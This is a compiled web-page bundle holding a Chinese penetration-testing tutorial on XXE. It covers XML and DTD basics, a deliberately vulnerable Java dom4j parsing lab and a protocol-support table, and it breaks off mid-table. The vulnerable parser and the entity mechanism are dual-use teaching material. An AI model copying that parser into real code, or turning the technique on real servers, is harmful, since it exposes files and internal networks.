"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[8917],{7569:(e,n,l)=>{l.r(n),l.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>a,frontMatter:()=>d,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XXE/README","title":"XXE","description":"d4m1ts_2021","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/11.XXE/README.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/11.XXE","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XXE/","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/XXE/","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"LDAP\u6ce8\u5165","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/LDAP\u6ce8\u5165/"},"next":{"title":"\u547d\u4ee4\u6267\u884c","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/\u547d\u4ee4\u6267\u884c/"}}');var t=l(74848),i=l(28453);const d={},r="XXE",c={},o=[{value:"\u7b80\u4ecb",id:"\u7b80\u4ecb",level:2},{value:"XML\u57fa\u7840",id:"xml\u57fa\u7840",level:2},{value:"XML\u8bed\u6cd5",id:"xml\u8bed\u6cd5",level:3},{value:"XML DTD",id:"xml-dtd",level:3},{value:"DTD\u7b80\u4ecb",id:"dtd\u7b80\u4ecb",level:4},{value:"DTD\u5b9e\u4f53",id:"dtd\u5b9e\u4f53",level:4},{value:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa",id:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa",level:2},{value:"XXE\u57fa\u7840\u5229\u7528",id:"xxe\u57fa\u7840\u5229\u7528",level:2},{value:"\u8bfb\u53d6\u6587\u4ef6",id:"\u8bfb\u53d6\u6587\u4ef6",level:3},{value:"SSRF",id:"ssrf",level:3},{value:"\u6267\u884c\u7cfb\u7edf\u547d\u4ee4",id:"\u6267\u884c\u7cfb\u7edf\u547d\u4ee4",level:3},{value:"\u62d2\u7edd\u670d\u52a1\u653b\u51fb",id:"\u62d2\u7edd\u670d\u52a1\u653b\u51fb",level:3},{value:"XInclude\u653b\u51fb",id:"xinclude\u653b\u51fb",level:2},{value:"\u54ea\u4e9b\u5730\u65b9\u53ef\u80fd\u5b58\u5728XXE",id:"\u54ea\u4e9b\u5730\u65b9\u53ef\u80fd\u5b58\u5728xxe",level:2},{value:"\u9632\u5fa1",id:"\u9632\u5fa1",level:2},{value:"Payload",id:"payload",level:2},{value:"Basic",id:"basic",level:3},{value:"Basic XML Example",id:"basic-xml-example",level:4},{value:"Entity Example",id:"entity-example",level:4},{value:"Inband Injection",id:"inband-injection",level:3},{value:"Extract data from the server",id:"extract-data-from-the-server",level:4},{value:"XXE Base64 encoded",id:"xxe-base64-encoded",level:4},{value:"PHP Wrapper inside XXE",id:"php-wrapper-inside-xxe",level:4},{value:"OOB Injection",id:"oob-injection",level:3},{value:"Vanilla, used to verify outbound xxe or blind xxe",id:"vanilla-used-to-verify-outbound-xxe-or-blind-xxe",level:4},{value:"OoB extraction1",id:"oob-extraction1",level:4},{value:"OoB variation of above (seems to work better against .NET)",id:"oob-variation-of-above-seems-to-work-better-against-net",level:4},{value:"OoB extraction2",id:"oob-extraction2",level:4},{value:"OoB extra ERROR -- Java",id:"oob-extra-error----java",level:4},{value:"OoB XXE Base64 -- PHP",id:"oob-xxe-base64----php",level:4},{value:"OoB extra nice",id:"oob-extra-nice",level:4},{value:"File-not-found exception based extraction",id:"file-not-found-exception-based-extraction",level:4},{value:"FTP",id:"ftp",level:4},{value:"Inside SOAP body",id:"inside-soap-body",level:4},{value:"XXE inside SVG",id:"xxe-inside-svg",level:4},{value:"Untested - WAF Bypass",id:"untested---waf-bypass",level:4},{value:"DOS",id:"dos",level:3},{value:"\u5305\u62ec\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6",id:"\u5305\u62ec\u4e00\u4e2a\u968f\u673a\u7684\u6587\u4ef6",level:4},{value:"Billion Laugh Attack - Denial Of Service",id:"billion-laugh-attack---denial-of-service",level:4},{value:"FTP Server\u4ee3\u7801\u5907\u4efd",id:"ftp-server\u4ee3\u7801\u5907\u4efd",level:2},{value:"\u53c2\u8003\u6587\u7ae0",id:"\u53c2\u8003\u6587\u7ae0",level:2}];function x(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",hr:"hr",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"xxe",children:"XXE"})}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{src:"https://img.shields.io/badge/d4m1ts-2021-ff751a?logo=Ethereum&logoColor=3C3C3D&labelColor=bfbfbf",alt:"d4m1ts_2021"})}),"\n",(0,t.jsx)(n.h2,{id:"\u7b80\u4ecb",children:"\u7b80\u4ecb"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"XXE\uff08XML External Entity Injection\uff09"}),"\u5168\u79f0",(0,t.jsx)(n.code,{children:"XML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e"}),"\uff0c\u65e2\u7136\u662f\u6ce8\u5165\uff0c\u8bf4\u660e\u4e5f\u662f\u6267\u884c\u4e86\u6211\u4eec\u7684\u6076\u610f\u4ee3\u7801\u3002"]}),"\n",(0,t.jsxs)(n.p,{children:["\u5b83\u4ea7\u751f\u7684\u539f\u56e0\u662f\uff1a",(0,t.jsx)(n.strong,{children:"\u5e94\u7528\u7a0b\u5e8f\u5728\u89e3\u6790XML\u5185\u5bb9\u65f6\uff0c\u6ca1\u6709\u7981\u6b62\u5916\u90e8\u5b9e\u4f53\u7684\u52a0\u8f7d\uff0c\u5bfc\u81f4\u53ef\u52a0\u8f7d\u6076\u610f\u5916\u90e8\u6587\u4ef6"}),"\uff1b\u56e0\u6b64\u5982\u679cXML\u5185\u5bb9\u53ef\u63a7\uff0c\u90a3\u4e48\u5c31\u53ef\u9020\u6210"]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"\u6587\u4ef6\u8bfb\u53d6"}),"\n",(0,t.jsx)(n.li,{children:"\u547d\u4ee4\u6267\u884c\uff08\u96be\uff09"}),"\n",(0,t.jsx)(n.li,{children:"\u5185\u7f51\u7aef\u53e3\u626b\u63cf"}),"\n",(0,t.jsx)(n.li,{children:"\u653b\u51fb\u5185\u7f51\u7f51\u7ad9"}),"\n",(0,t.jsx)(n.li,{children:"\u53d1\u8d77dos\u653b\u51fb"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u7b49\u5371\u5bb3\u3002"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"\u7b2c XX \u6b21\u6ce8\u5c04",src:l(21566).A+"",width:"781",height:"440"})}),"\n",(0,t.jsx)(n.h2,{id:"xml\u57fa\u7840",children:"XML\u57fa\u7840"}),"\n",(0,t.jsx)(n.p,{children:"\u65e2\u7136\u6f0f\u6d1e\u662f\u7531\u4e8e\u89e3\u6790XML\u5f15\u8d77\u7684\uff0c\u90a3\u4e48\u4e0d\u4e86\u89e3\u4e00\u4e0bXML\u600e\u4e48\u884c\u5462\uff1f"}),"\n",(0,t.jsx)(n.p,{children:"XML\u548cHTML\u957f\u5f97\u6709\u70b9\u7c7b\u4f3c\uff0c\u90fd\u662f\u57fa\u4e8e\u6807\u7b7e\u7684\u683c\u5f0f\uff0c\u4f46\u662fHTML\u88ab\u8bbe\u8ba1\u7528\u6765\u663e\u793a\u6570\u636e\uff0cXML\u5219\u88ab\u8bbe\u8ba1\u7528\u6765\u4f20\u8f93\u548c\u5b58\u50a8\u6570\u636e"}),"\n",(0,t.jsx)(n.h3,{id:"xml\u8bed\u6cd5",children:"XML\u8bed\u6cd5"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"XML \u58f0\u660e\u6587\u4ef6\u7684\u53ef\u9009\u90e8\u5206\uff0c\u5982\u679c\u5b58\u5728\u9700\u8981\u653e\u5728\u6587\u6863\u7684\u7b2c\u4e00\u884c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8" ?>\n'})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:["XML \u5fc5\u987b\u5305\u542b\u6839\u5143\u7d20\uff0c\u5b83\u662f\u6240\u6709\u5176\u4ed6\u5143\u7d20\u7684\u7236\u5143\u7d20\uff0c\u6bd4\u5982\u4e0b\u9762\u7684",(0,t.jsx)(n.code,{children:"userInfo"}),"\u5143\u7d20"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"<userInfo>\n    <name>d4m1ts</name>\n    <age>18</age>\n</userInfo>\n"})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"\u6240\u6709\u7684 XML \u5143\u7d20\u90fd\u5fc5\u987b\u6709\u4e00\u4e2a\u5173\u95ed\u6807\u7b7e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"<p>paragraph</p> \x3c!-- \u540e\u9762\u7684 </p> \u4e0d\u80fd\u7701\u7565 --\x3e\n"})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:["XML \u6807\u7b7e\u5bf9\u5927\u5c0f\u5199\u654f\u611f\u3002\u6807\u7b7e ",(0,t.jsx)(n.code,{children:"<Letter>"})," \u4e0e\u6807\u7b7e ",(0,t.jsx)(n.code,{children:"<letter>"})," \u662f\u4e0d\u540c\u7684\uff0c\u5fc5\u987b\u4f7f\u7528\u76f8\u540c\u7684\u5927\u5c0f\u5199\u6765\u7f16\u5199\u6253\u5f00\u6807\u7b7e\u548c\u5173\u95ed\u6807\u7b7e"]}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:["\u6240\u6709\u5143\u7d20\u90fd",(0,t.jsx)(n.strong,{children:"\u5fc5\u987b"}),"\u5f7c\u6b64\u6b63\u786e\u5730\u5d4c\u5957"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"<b><p>This text is bold and italic</b></p> \x3c!-- \u9519\u8bef --\x3e\n<p><i>This text is bold and italic</i></p> \x3c!-- \u6b63\u786e --\x3e\n"})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"\u5c5e\u6027\u90fd\u5fc5\u987b\u6dfb\u52a0\u53cc\u5f15\u53f7\uff0c\u8fd9\u70b9\u548cHTML\u7c7b\u4f3c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<p attr="\u52a0\u53cc\u5f15\u53f7">aa</p>\n'})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"XML\u6ce8\u91ca\u548cHTML\u4e00\u6837"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"\x3c!-- \u6211\u662f\u6ce8\u91ca --\x3e\n"})}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(n.h3,{id:"xml-dtd",children:"XML DTD"}),"\n",(0,t.jsx)(n.h4,{id:"dtd\u7b80\u4ecb",children:"DTD\u7b80\u4ecb"}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"XML DTD(Document Type Definition)\u6587\u6863\u7c7b\u578b\u5b9a\u4e49"}),"\u7684\u4f5c\u7528\u662f\u5b9a\u4e49 XML \u6587\u6863\u7684\u5408\u6cd5\u6784\u5efa\u6a21\u5757\uff0c\u5b83\u4f7f\u7528\u4e00\u7cfb\u5217\u5408\u6cd5\u7684\u5143\u7d20\u6765",(0,t.jsx)(n.strong,{children:"\u5b9a\u4e49\u6587\u6863\u7684\u7ed3\u6784"}),"\u3002"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:["\u5185\u90e8",(0,t.jsx)(n.code,{children:"DOCTYPE"}),"\u58f0\u660e"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"    \x3c!-- \u8bed\u6cd5 --\x3e\n    <!DOCTYPE root-element [element-declarations]>\n"})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'    <?xml version="1.0" encoding="UTF-8" ?>\n    <!DOCTYPE userInfo [\n            <!ELEMENT userInfo (name,age)>\n            <!ELEMENT name (#PCDATA)>\n            <!ELEMENT age (#PCDATA)>\n            ]>\n    \n    <userInfo>\n        <name>d4m1ts</name>\n        <age>18</age>\n    </userInfo>\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"\u4ee5\u4e0a DTD \u89e3\u91ca\u5982\u4e0b\uff1a"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"!DOCTYPE userInfo"})," (\u7b2c\u4e8c\u884c)\u5b9a\u4e49\u6b64\u6587\u6863\u662f ",(0,t.jsx)(n.strong,{children:"userInfo"})," \u7c7b\u578b\u7684\u6587\u6863\u3002"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"!ELEMENT userInfo"})," (\u7b2c\u4e09\u884c)\u5b9a\u4e49 ",(0,t.jsx)(n.strong,{children:"userInfo"}),' \u5143\u7d20\u6709\u4e24\u4e2a\u5143\u7d20\uff1a"name\u3001age"']}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"!ELEMENT name"})," (\u7b2c\u56db\u884c)\u5b9a\u4e49 ",(0,t.jsx)(n.strong,{children:"name"}),' \u5143\u7d20\u4e3a "#PCDATA" \u7c7b\u578b']}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"PCDATA"})," \u662f\u4f1a\u88ab\u89e3\u6790\u5668\u89e3\u6790\u7684\u6587\u672c\uff0c\u8fd9\u4e9b\u6587\u672c\u5c06\u88ab\u89e3\u6790\u5668\u68c0\u67e5\u5b9e\u4f53\u4ee5\u53ca\u6807\u8bb0\uff0c\u6587\u672c\u4e2d\u7684\u6807\u7b7e\u4f1a\u88ab\u5f53\u4f5c\u6807\u8bb0\u6765\u5904\u7406\uff0c\u800c\u5b9e\u4f53\u4f1a\u88ab\u5c55\u5f00"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"CDATA"})," \u662f\u4e0d\u4f1a\u88ab\u89e3\u6790\u5668\u89e3\u6790\u7684\u6587\u672c\u3002\u5728\u8fd9\u4e9b\u6587\u672c\u4e2d\u7684\u6807\u7b7e\u4e0d\u4f1a\u88ab\u5f53\u4f5c\u6807\u8bb0\u6765\u5bf9\u5f85\uff0c\u5176\u4e2d\u7684\u5b9e\u4f53\u4e5f\u4e0d\u4f1a\u88ab\u5c55\u5f00\u3002"]}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsxs)(n.p,{children:["\u5916\u90e8",(0,t.jsx)(n.code,{children:"DOCTYPE"}),"\u58f0\u660e"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'\x3c!-- \u8bed\u6cd5 --\x3e\n    <!DOCTYPE root-element SYSTEM "filename">\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'    \x3c!-- XML\u6587\u4ef6 --\x3e\n    <?xml version="1.0"?>\n    <!DOCTYPE note SYSTEM "note.dtd">\n    <note>\n      <to>Tove</to>\n      <from>Jani</from>\n      <heading>Reminder</heading>\n      <body>Don\'t forget me this weekend!</body>\n    </note>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'    \x3c!-- \u5305\u542b DTD \u7684 "note.dtd" \u6587\u4ef6 --\x3e\n    <!ELEMENT note (to,from,heading,body)>\n    <!ELEMENT to (#PCDATA)>\n    <!ELEMENT from (#PCDATA)>\n    <!ELEMENT heading (#PCDATA)>\n    <!ELEMENT body (#PCDATA)>\n'})}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.img,{alt:"image-20211104141555074",src:l(83633).A+"",width:"990",height:"496"})}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsxs)(n.p,{children:["\u5728XML\u4e2d\uff0c\u67095\u4e2a\u9884\u5b9a\u4e49\u7684\u5b9e\u4f53\u5f15\u7528\uff0c\u8fd9\u662f\u4e3a\u4e86\u9632\u6b62\u5728\u89e3\u6790\u7684\u65f6\u5019\uff0c\u7ed9\u6211\u4eec\u8f93\u5165\u7684",(0,t.jsx)(n.code,{children:"<"}),"\u5f53\u6210\u6807\u7b7e\u6765\u5904\u7406\uff0c\u5bfc\u81f4\u5f02\u5e38"]}),"\n",(0,t.jsxs)(n.table,{children:[(0,t.jsx)(n.thead,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.th,{style:{textAlign:"left"},children:"\u5b9e\u4f53\u5f15\u7528"}),(0,t.jsx)(n.th,{style:{textAlign:"left"},children:"\u5b57\u7b26"})]})}),(0,t.jsxs)(n.tbody,{children:[(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"left"},children:(0,t.jsx)(n.code,{children:"&lt;"})}),(0,t.jsx)(n.td,{style:{textAlign:"left"},children:(0,t.jsx)(n.code,{children:"<"})})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"left"},children:(0,t.jsx)(n.code,{children:"&gt;"})}),(0,t.jsx)(n.td,{style:{textAlign:"left"},children:">"})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"left"},children:(0,t.jsx)(n.code,{children:"&amp;"})}),(0,t.jsx)(n.td,{style:{textAlign:"left"},children:"&"})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"left"},children:(0,t.jsx)(n.code,{children:"&quot;"})}),(0,t.jsx)(n.td,{style:{textAlign:"left"},children:'"'})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"left"},children:(0,t.jsx)(n.code,{children:"&apos;"})}),(0,t.jsx)(n.td,{style:{textAlign:"left"},children:"'"})]})]})]}),"\n",(0,t.jsx)(n.p,{children:"\u4e3e\u4f8b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"<message>if salary &lt; 1000 then</message>\n"})}),"\n",(0,t.jsx)(n.h4,{id:"dtd\u5b9e\u4f53",children:"DTD\u5b9e\u4f53"}),"\n",(0,t.jsxs)(n.p,{children:["\u5b9e\u4f53\u662f\u7528\u4e8e",(0,t.jsxs)(n.strong,{children:["\u5b9a\u4e49\u5f15\u7528\u666e\u901a\u6587\u672c\u6216\u7279\u6b8a\u5b57\u7b26\u7684\u5feb\u6377\u65b9\u5f0f\u7684",(0,t.jsx)(n.code,{children:"\u53d8\u91cf"})]}),"\u3002"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"\u4e00\u4e2a\u5185\u90e8\u5b9e\u4f53\u58f0\u660e"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'  \x3c!-- \u8bed\u6cd5 --\x3e\n  <!ENTITY entity-name "entity-value">\n'})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'  <?xml version="1.0" encoding="UTF-8" ?>\n  <!DOCTYPE userInfo [\n          <!ELEMENT userInfo (name,age)>\n          <!ELEMENT name (#PCDATA)>\n          <!ELEMENT age (#PCDATA)>\n          <!ENTITY name "d4m1ts">\n          ]>\n  \n  <userInfo>\n      <name>&name;</name>\n      <age>18</age>\n  </userInfo>\n'})}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.p,{children:"\u4e00\u4e2a\u5916\u90e8\u5b9e\u4f53\u58f0\u660e"}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'\x3c!-- \u8bed\u6cd5 --\x3e\n<!ENTITY entity-name SYSTEM "URI/URL">\n'})}),"\n"]}),"\n",(0,t.jsxs)(n.li,{children:["\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'  \x3c!-- \u4e0d\u8981\u6c42\u540e\u7f00\u4e00\u5b9a\u662fdtd\uff0c\u53ea\u8981\u7b26\u5408dtd\u6587\u4ef6\u683c\u5f0f\u5373\u53ef --\x3e\n  <!ENTITY name SYSTEM "http://baidu.com/test.dtd">\n'})}),"\n"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa",children:"\u6f0f\u6d1e\u73af\u5883\u642d\u5efa"}),"\n",(0,t.jsxs)(n.p,{children:["\u670d\u52a1\u5668\u89e3\u6790XML\u51fa\u73b0\u95ee\u9898\uff0c\u90a3\u6f0f\u6d1e\u73af\u5883\u5c31\u5199\u4e00\u4e2a\u53ef\u4ee5\u89e3\u6790XML\u5185\u5bb9\u7684\u4ee3\u7801\u5373\u53ef\u3002\u8fd9\u91cc\u6211\u7528Java\u4e2d\u7684",(0,t.jsx)(n.code,{children:"SAXReader"}),"\u8fd9\u4e2a\u7c7b\u7684",(0,t.jsx)(n.code,{children:"read()"}),"\u65b9\u6cd5\u6765\u89e6\u53d1"]}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u4f9d\u8d56"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:"        \x3c!-- https://mvnrepository.com/artifact/org.dom4j/dom4j --\x3e\n        <dependency>\n            <groupId>org.dom4j</groupId>\n            <artifactId>dom4j</artifactId>\n            <version>2.1.1</version>\n        </dependency>\n"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"\u6f0f\u6d1e\u4ee3\u7801"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-java",children:'import org.dom4j.Document;\nimport org.dom4j.DocumentException;\nimport org.dom4j.Element;\nimport org.dom4j.io.SAXReader;\n\nimport java.io.File;\n\npublic class Main {\n    public static void main(String[] args) throws DocumentException {\n        SAXReader saxReader = new SAXReader();\n        Document document = saxReader.read(new File("src/main/resources/test.xml"));\n        Element rootElement = document.getRootElement();\n        System.out.println(rootElement.element("name").getData());\n    }\n}\n\n'})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsx)(n.li,{children:"test.xml"}),"\n"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8" ?>\n<!DOCTYPE userInfo [\n        <!ELEMENT userInfo (name)>\n        <!ELEMENT name (#PCDATA)>\n        <!ENTITY name "d4m1ts">\n        ]>\n\n<userInfo>\n    <name>&name;</name>\n</userInfo>\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u540e\u7eed\u53ea\u9700\u8981\u4fee\u6539",(0,t.jsx)(n.code,{children:"test.xml"}),"\u4e2d\u7684\u5185\u5bb9\u5373\u53ef"]}),"\n",(0,t.jsx)(n.h2,{id:"xxe\u57fa\u7840\u5229\u7528",children:"XXE\u57fa\u7840\u5229\u7528"}),"\n",(0,t.jsx)(n.p,{children:"\u5728\u4e0a\u9762\u52a0\u8f7d\u5916\u90e8\u5b9e\u4f53\u58f0\u660e\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u6ce8\u610f\u5230\u5b83\u7684\u8bed\u6cd5"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-xml",children:'<!ENTITY entity-name SYSTEM "URI/URL">\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u53ef\u4ee5\u4ece\u4e00\u4e2aURL\u52a0\u8f7dDTD\uff0c\u5f53\u7136\u6309\u7167\u975e\u6b63\u5e38\u7684\u601d\u7ef4\uff0c\u5141\u8bb8\u8f93\u5165URL\u4e5f\u5c31\u76f8\u5f53\u4e8e\u5141\u8bb8\u8f93\u5165\u5176\u4ed6\u7c7b\u4f3c",(0,t.jsx)(n.code,{children:"http"}),"\u7684\u534f\u8bae\u7684\u94fe\u63a5\uff0c\u6bd4\u5982",(0,t.jsx)(n.code,{children:"file"}),"\u3001",(0,t.jsx)(n.code,{children:"ftp"}),"\u8fd9\u4e9b\uff0c\u90a3\u8fd9\u91cc\u5c82\u4e0d\u662f\u81f3\u5c11\u5c31\u53ef\u80fd\u5b58\u57282\u4e2a\u6f0f\u6d1e\u4e86"]}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsx)(n.li,{children:"SSRF"}),"\n",(0,t.jsx)(n.li,{children:"\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"\u5404\u8bed\u8a00\u652f\u6301\u7684\u534f\u8bae\u5982\u4e0b\uff1a"}),"\n",(0,t.jsxs)(n.table,{children:[(0,t.jsx)(n.thead,{children:(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"LIBXML2"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"PHP"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:"JAVA"}),(0,t.jsx)(n.th,{style:{textAlign:"center"},children:".NET"})]})}),(0,t.jsxs)(n.tbody,{children:[(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"file"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"file"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"http"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"file"})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"http"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"http"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"https"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"http"})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"ftp"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"ftp"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"ftp"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"https"})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"}}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"php"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"file"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"ftp"})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"}}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"compress.zlib"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"jar"}),(0,t.jsx)(n.td,{style:{textAlign:"center"}})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"}}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"compress.bzip2"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"netdoc"}),(0,t.jsx)(n.td,{style:{textAlign:"center"}})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"}}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"data"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"mailto"}),(0,t.jsx)(n.td,{style:{textAlign:"center"}})]}),(0,t.jsxs)(n.tr,{children:[(0,t.jsx)(n.td,{style:{textAlign:"center"}}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"glob"}),(0,t.jsx)(n.td,{style:{textAlign:"center"},children:"gopher 